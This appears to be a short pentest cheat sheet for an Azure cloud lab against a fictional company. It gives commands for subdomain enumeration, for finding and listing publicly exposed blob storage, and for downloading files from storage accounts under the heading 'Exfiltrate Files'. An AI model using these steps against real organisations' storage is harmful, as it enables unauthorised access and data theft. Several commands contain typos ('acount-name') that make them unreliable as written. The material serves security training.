AzSubEnum.py {External Attack Vector}
#Search for domains that are related to Azure based on the base domain

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 azsubenum.py -b megabigtech -t 10 -p permutations.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


BasicBlobFinder.py  {External Attack Vector}
#Enumerate Potential files on blob storage accounts
Identifying #BlobStorage accounts based on permutations (make sure add internal to domain when creating list)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
for word in $(cat ../AzSubEnum/permutations.txt); do echo megabigtechinternal:$word > namelist ;done
python3 basicblobfinder.py namelist

    https://megabigtechinternal.blob.core.windows.net/data/ApplicationIDs.csv
    https://megabigtechinternal.blob.core.windows.net/data/privateData.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Manual BasicBlobFinder.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$storageAccount = "megabigtechinternal"
$containerName = "data"
$HOSTSUFFIX=".blob.core.windows.net"
$URLPARAM="?restype=container&comp=list"
$url = "https://$storageAccount$HOSTSUFFIX/$containerName$URLPARAM"
invoke-webrequest $url
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




Exfiltrate Files from Azuer Blob Storage {Internal Attack Vector}
List Storage accounts, containers and files if available

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
az storage account list
az storage container list --account-name mbtresearch --auth-mode login
az storage blob        list --acount-name mbtresearch --container-name research-files  --auth-mode login
#Download files
az storage blob download --acount-name mbtresearch --container-name research-files --file ephone-16-final.jpg --name ephone-16-final.jpg --auth-mode login
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
